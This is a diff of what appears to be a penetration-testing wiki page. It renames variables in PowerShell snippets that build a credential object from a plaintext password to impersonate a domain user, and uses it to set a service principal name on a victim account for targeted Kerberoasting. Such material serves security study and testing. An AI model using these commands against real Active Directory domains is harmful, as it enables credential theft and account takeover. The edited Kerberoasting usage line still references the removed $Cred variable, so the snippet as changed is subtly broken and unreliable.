@@ -24,11 +24,11 @@ In Powershell, it is possible to impersonate a user by create a credential objec
 
 ```bash
 # Credential object creation (prompted)
-$c = Get-Credential
+$credential = Get-Credential
 
 # Credential object creation (not prompted)
-$SecPassword = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $SecPassword)
+$password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
 
 # Usage
 Start-Process Notepad.exe -Credential $credential
@@ -42,8 +42,8 @@ Here is an example for [targeted Kerberoasting](../abusing-aces/targeted-kerbero
 
 ```bash
 # Credential object creation (not prompted)
-$SecPassword = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $SecPassword)
+$password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
 
 # Usage
 Set-DomainObject -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' -Identity 'victimuser' -Set @{serviceprincipalname='nonexistant/BLAHBLAH'}
